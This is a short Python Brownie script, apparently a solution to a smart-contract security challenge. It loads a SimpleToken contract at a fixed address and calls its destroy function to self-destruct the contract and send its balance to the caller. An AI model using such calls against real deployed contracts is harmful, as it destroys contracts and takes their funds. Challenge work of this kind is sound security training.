from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from brownie import SimpleToken, LibraryContract, AttackPreservation, network, Contract
from web3 import Web3
from web3.auto import w3


def main():
    print(network.show_active())
    account = get_account()

    address = "0xB18d6Df3d97EDc73E5121E67106B32E4660ff14C"
    token = Contract.from_abi(SimpleToken._name, address, SimpleToken.abi)

    print(f"Balance? : {token.balance()}")
    token.destroy(account, {"from": account})

    print(f"Balance? : {token.balance()}")
